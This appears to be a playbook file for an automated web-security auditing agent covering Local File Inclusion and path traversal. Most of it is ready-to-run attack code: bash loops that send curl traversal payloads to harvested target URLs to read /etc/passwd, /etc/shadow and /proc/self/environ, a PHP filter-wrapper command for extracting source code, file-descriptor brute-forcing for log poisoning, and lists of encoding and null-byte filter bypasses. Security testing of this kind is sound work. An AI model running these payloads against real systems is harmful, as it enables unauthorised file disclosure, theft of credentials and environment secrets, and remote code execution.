---
name: web-lfi-path-traversal-audit
description: Local File Inclusion (LFI) and Directory Traversal discovery, null-byte / encoding bypasses, and procfs exploitation.
playbook: web-security
---

# Web Local File Inclusion & Directory Traversal Audit

## Attack Vector Summary
Local File Inclusion (LFI) and Directory Traversal occur when user input is passed directly to filesystem access APIs (`open()`, `include`, `require`, `file_get_contents`, `res.sendFile()`) without strict path normalization or sanitization, allowing attackers to access arbitrary files on the server or execute code via log poisoning or wrappers.

## Tactical Heuristics & Step-by-Step Flow

### 1. Candidate Parameter Extraction (R7 -> ptLFI.txt)
Filter extracted URLs and query parameters for LFI-prone parameter names:

```bash
# Filter all harvested URLs for LFI-prone parameters
grep -oP '(\?|&)(file|page|path|load|read|include|inc|template|root|dir|document|folder|view|show|local|full|location|pg|abs|name|cat|cmd|action)[=][^&\s]+' \
  Recon/target_params.txt 2>/dev/null | sort -u > Recon/ptLFI.txt
```

### 2. Linux Filesystem Probes (E2)
If server OS is detected as Linux (via WhatWeb / R8), probe standard Linux files:

```bash
# 1. Standard Linux System Files
for payload in /etc/passwd /etc/shadow /proc/self/environ /proc/self/cmdline /etc/hosts; do
  cat Recon/ptLFI.txt 2>/dev/null | while read line; do
    param=$(echo "$line" | cut -d= -f1 | tr -d '?&')
    url_base=$(echo "$line" | cut -d= -f1)
    curl -s -m 5 "$url_base$param=../../../../../../..$payload" | grep -qi "root:x:0:0:" && \
      echo "✅ LFI Confirmed: $url_base$param=../../../../../../..$payload" >> Recon/target_lfi_exploited.txt
  done
done
```

### 3. Windows Filesystem Probes (E2)
If server OS is detected as Windows, probe standard Windows paths:

```bash
# 2. Windows System Files
for payload in "C:\\boot.ini" "C:\\WINDOWS\\win.ini" "C:\\WINDOWS\\System32\\drivers\\etc\\hosts"; do
  cat Recon/ptLFI.txt 2>/dev/null | while read line; do
    param=$(echo "$line" | cut -d= -f1 | tr -d '?&')
    url_base=$(echo "$line" | cut -d= -f1)
    curl -s -m 5 "$url_base$param=..\\..\\..\\..\\..\\..\\..$payload" | grep -qi "\[fonts\]\|\[extensions\]" && \
      echo "✅ LFI Windows Confirmed: $url_base$param=..\\..\\..\\..\\..\\..\\..$payload" >> Recon/target_lfi_exploited.txt
  done
done
```

### 4. PHP Filter Wrappers & /proc/self/fd Log Poisoning (E2)
For PHP backends, extract source code via base64 filter wrappers or brute force file descriptors:

```bash
# 1. PHP Base64 Source Extraction
curl -s -m 5 "$url_base$param=php://filter/convert.base64-encode/resource=index.php" | \
  grep -oP 'PD9waHA[^"]+' | base64 -d

# 2. File Descriptor Brute-Force (/proc/self/fd/0-30 for log poisoning)
for fd in $(seq 0 30); do
  cat Recon/ptLFI.txt 2>/dev/null | while read line; do
    param=$(echo "$line" | cut -d= -f1 | tr -d '?&')
    url_base=$(echo "$line" | cut -d= -f1)
    result=$(curl -s -m 3 "$url_base$param=../../../../../../proc/self/fd/$fd" 2>/dev/null)
    if [ -n "$result" ] && [ ${#result} -gt 50 ]; then
      echo "📁 FD $fd -> ${result:0:80}" >> Recon/target_lfi_exploited.txt
    fi
  done
done
```

### 5. Path Traversal Filter Bypasses
```text
# Double URL Encoding
?page=%252e%252e%252fetc%252fpasswd

# Null Byte (Legacy PHP < 5.3.4)
?page=../../../../etc/passwd%00

# Path Truncation & Non-recursive Filter Stripping
?page=....//....//....//etc/passwd
?page=....\/....\/....\/etc/passwd
?page=././././etc/passwd
```

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Mechanism | Empirical Pattern | Expected Evidence Marker |
|---|---|---|---|
| Deep Directory Traversal | Missing path normalization on download handler | `../../../../../../etc/passwd` | Contains `root:x:0:0:` or `[extensions]` |
| Base64 PHP Filter Wrapper | Bypasses extension check by streaming base64 | `php://filter/convert.base64-encode/resource=config.php` | Valid base64 blob decoding to PHP source |
| ProcFS Environ Extraction | Leaks process environment variables via procfs | `../../../../proc/self/environ` | Environment strings, AWS keys, or DB passwords |
| Log Poisoning via /proc/self/fd | Injects PHP code into user-agent and includes FD | `../../../../proc/self/fd/3` | Code execution / server command execution |

## Evidence Collection & Validation Gate
- Must capture raw request and response containing disclosed file contents.
- Document exact root cause parameter and filesystem normalization failure.
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
